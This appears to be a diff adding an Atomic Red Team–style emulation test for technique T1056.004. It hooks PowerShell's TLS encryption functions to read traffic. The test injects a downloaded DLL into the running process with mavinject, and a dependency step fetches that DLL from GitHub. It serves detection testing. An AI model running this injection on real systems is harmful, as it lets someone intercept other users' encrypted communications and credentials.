@@ -1,0 +1,92 @@
+{
+  "id": "de1934ea-1fbf-425b-8795-65fb27dd7e33",
+  "name": "Hook PowerShell TLS Encrypt/Decrypt Messages",
+  "description": "Hooks functions in PowerShell to read TLS Communications\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "60028901-7dd3-4168-a52d-c77f413f4715",
+      "type": "execute-command",
+      "data": {
+        "command": "mavinject $pid /INJECTRUNNING \"#{file_name}\"\nInvoke-WebRequest #{server_name} -UseBasicParsing\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4b038644-1174-487c-beea-366c99e19b6e",
+      "name": "Check dependency 1/1",
+      "description": "T1056.004x64.dll must exist on disk at specified location (#{file_name})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b2f5b52e-8fd4-4dc1-b9d4-e2d7ee275b73",
+      "name": "Resolve dependency 1/1",
+      "description": "T1056.004x64.dll must exist on disk at specified location (#{file_name})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll\" -OutFile \"#{file_name}\" -UseBasicParsing\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "bc62a88d-97af-41b1-acb6-339bb6ca0f1b",
+      "name": "Re-check dependency 1/1",
+      "description": "T1056.004x64.dll must exist on disk at specified location (#{file_name})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "4b038644-1174-487c-beea-366c99e19b6e",
+      "p": "on-success",
+      "o": "60028901-7dd3-4168-a52d-c77f413f4715"
+    },
+    {
+      "s": "4b038644-1174-487c-beea-366c99e19b6e",
+      "p": "on-failure",
+      "o": "b2f5b52e-8fd4-4dc1-b9d4-e2d7ee275b73"
+    },
+    {
+      "s": "b2f5b52e-8fd4-4dc1-b9d4-e2d7ee275b73",
+      "p": "on-success",
+      "o": "bc62a88d-97af-41b1-acb6-339bb6ca0f1b"
+    },
+    {
+      "s": "bc62a88d-97af-41b1-acb6-339bb6ca0f1b",
+      "p": "on-failure",
+      "o": "60028901-7dd3-4168-a52d-c77f413f4715"
+    }
+  ],
+  "tags": [
+    "T1056.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "file_name",
+      "type": "path",
+      "description": "Dll To Inject",
+      "value": "PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll"
+    },
+    {
+      "name": "server_name",
+      "type": "url",
+      "description": "TLS Server To Test Get Request",
+      "value": "https://www.example.com"
+    }
+  ]
+}
